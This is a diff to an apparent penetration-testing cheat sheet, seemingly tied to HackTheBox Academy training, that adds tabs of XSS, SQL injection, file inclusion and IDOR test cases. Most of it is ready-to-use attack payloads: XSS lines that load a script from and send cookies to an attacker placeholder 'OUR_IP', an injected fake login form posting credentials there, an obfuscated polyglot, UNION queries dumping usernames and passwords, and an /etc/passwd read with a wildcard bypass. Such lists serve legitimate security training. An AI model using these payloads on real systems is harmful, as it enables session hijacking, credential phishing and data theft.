@@ -1,5 +1,57 @@
-# SQLi Testing
+# Targeted Test Cases
 
+{% tabs %}
+{% tab title="XSS" %}
+
+
+| Code                                                                                                                                                                                                                                                                                                                                                                                                  | Description                         |
+| ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------- |
+| `<script>alert(window.origin)</script>`                                                                                                                                                                                                                                                                                                                                                               | Basic XSS Payload                   |
+| `<plaintext>`                                                                                                                                                                                                                                                                                                                                                                                         | Basic XSS Payload                   |
+| `<script>print()</script>`                                                                                                                                                                                                                                                                                                                                                                            | Basic XSS Payload                   |
+| `<img src="" onerror=alert(window.origin)>`                                                                                                                                                                                                                                                                                                                                                           | HTML-based XSS Payload              |
+| `<script>document.body.style.background = "#141d2b"</script>`                                                                                                                                                                                                                                                                                                                                         | Change Background Color             |
+| `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>`                                                                                                                                                                                                                                                                                                         | Change Background Image             |
+| `<script>document.title = 'HackTheBox Academy'</script>`                                                                                                                                                                                                                                                                                                                                              | Change Website Title                |
+| `<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>`                                                                                                                                                                                                                                                                                                                        | Overwrite website's main body       |
+| `<script>document.getElementById('urlform').remove();</script>`                                                                                                                                                                                                                                                                                                                                       | Remove certain HTML element         |
+| `<script src="http://OUR_IP/script.js"></script>`                                                                                                                                                                                                                                                                                                                                                     | Load remote script                  |
+| `<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>`                                                                                                                                                                                                                                                                                                                       | Send Cookie details to us           |
+| **`<iframe src=file:///C:/windows/win.ini>`**                                                                                                                                                                                                                                                                                                                                                         | Load remote ini file via iframe tag |
+| <p></p><pre class="language-javascript"><code class="lang-javascript">document.write('&#x3C;h3>Please login to continue&#x3C;/h3>&#x3C;form action=http://OUR_IP>&#x3C;input type="username" name="username" placeholder="Username">&#x3C;input type="password" name="password" placeholder="Password">&#x3C;input type="submit" name="submit" value="Login">&#x3C;/form>');
+</code></pre><p><br></p> | Login Form Injection                |
+
+#### Serve XSS 𝙥𝙖𝙮𝙡𝙤𝙖𝙙 from a XML file
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<html xmlns:html="http://w3.org/1999/xhtml">
+<html:script>prompt(document.domain);</html:script>
+</html>
+```
+
+#### Sample XSS Polyglot
+
+```
+'"onclick=(co\u006efirm)?.`0`><sVg/i="${{7*7}}"oNload=" 0>(pro\u006dpt)`1`"></svG/</sTyle/</scripT/</textArea/</iFrame/</noScript/</seLect/--><h1><iMg/srC/onerror=alert`2`>%22%3E%3CSvg/onload=confirm`3`//<Script/src=//ChiragXSS.xSs.ht></scripT>
+```
+
+#### **How to perform basic Login Form Injection via Reflected XSS**&#x20;
+
+Step 1: Test vulnerable form for the remove function by running script in console (Dev-Tools)
+
+```
+document.getElementById('urlform').remove();
+```
+
+Step 2: Inject form into webpage with XSS payload by executing the below script into console (Dev-tools)
+
+```
+document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
+```
+{% endtab %}
+
+{% tab title="SQLi" %}
 After successfully authenticating to a SQL Server \
 It is worth a shot to verify if xp\_cmdshell has been previously activated with:\
 
@@ -198,3 +250,80 @@ SELECT-id-1.FROM`test`
 uNiOn aLl SeleCt 1,2,3,4,conCat(username,0x3a,password),6 FroM users
 uNiOn aLl SeleCt 1,2,3,4,conCat(username,0x3a,password,0x3a,flag),6 FroM users
 ```
+{% endtab %}
+
+{% tab title="File Inclusion" %}
+## File Inclusion Parameters
+
+1. ?cat={payload}
+2. ?dir={payload}
+3. ?action={payload}
+4. ?board={payload}
+5. ?date={payload}
+6. ?detail={payload}
+7. ?file={payload}
+8. ?download={payload}
+9. ?path={payload}
+10. ?folder={payload}
+11. ?prefix={payload}
+12. ?include={payload}
+13. ?page={payload}
+14. ?inc={payload}
+15. ?locate={payload}
+16. ?show={payload}
+17. ?doc={payload}
+18. ?site={payload}
+19. ?type={payload}
+20. ?view={payload}
+21. ?content={payload}
+22. ?document={payload}
+23. ?layout={payload}
+24. ?mod={payload}
+25. ?conf={payload}
+
+
+
+## LFI workaround PoC
+
+LFI via this path does not work at first&#x20;
+
+&#x20;`/fileRead.jsp?fileName=/etc/passwd (406)`&#x20;
+
+But after replacing character with ? you may receive a successful response (200)
+
+`/fileRead.jsp?fileName=/?tc/?asswd (200)`
+
+`fileRead.jsp?fileName=/??c/??sswd (200)`
+{% endtab %}
+
+{% tab title="IDOR Checklist" %}
+* Find and replace `IDs` in urls, headers and body : `/users/01`=> `/users/02`
+* Try Parameter Pollution: `users=01` => `users=01&users=02`
+* Special Characters: `/users/01*` or `/users/*`  => Disclosure of every single user
+* Try Older versions of API endpoints: `/api/v3/users/01` => `/api/v1/users/02`
+* Add extension: `/users/01` => `/users/02.json`
+* Change Request Methods: POST /users/01 => `GET, PUT, PATCH, DELETE, OPTIONS,`etc
+* Check if Referer or other Headers are used to validate `IDs:`
+  * [ ] `GET /users/02`                                                              \
+    &#x20;  `Referer: example.com/users/`<mark style="color:red;">`01`</mark>                                     =>             `403 Forbidden`\
+
+  *   [ ] `GET /users/02`
+
+      `Referer: example.com/users/`<mark style="color:red;">`02`</mark>                                        =>             `200 OK`
+* Encrypted IDs: If application is using encrypted IDs, try to decrypt using hashing/cracking tool
+* Send wildcard `{""user_id"":""*""}`
+* Send ID twice `URL?id=&id=`
+* JSON wrap {“id”:111} --> `{“id”:{“id”:111}}`
+* Wrap ID with an array {“id”:111} --> `{“id”:[111]}`
+* Swap GUID with Numeric ID or email:\
+  `/users/XXXXXXXX-XXXX-XXXX-XXXXXXXXXXXX`   => `/users/02` or `/users/a@b.com`
+* Try GUIDs such as:\
+  `00000000-0000-0000-000000000000` and `11111111-1111-1111-111111111111`
+* GUID Enumeration: Try to disclose GUIDs using `Google Dorks`, `Github`, `Wayback`, `Burp history`
+* If none of the GUID Enumeration methods work then try: `SignUp`, `Reset Password`, and `other endpoints` and analyze the responses. An endpoint may disclose user's GUID within the application.
+* When a server responds with a 401/403, the action may still be performed. Ensure to verify the function within the application.&#x20;
+* Blind IDORs: Look for endpoints/features that may disclose information&#x20;
+* Chain IDOR with XSS for Account Takeovers\
+
+{% endtab %}
+{% endtabs %}
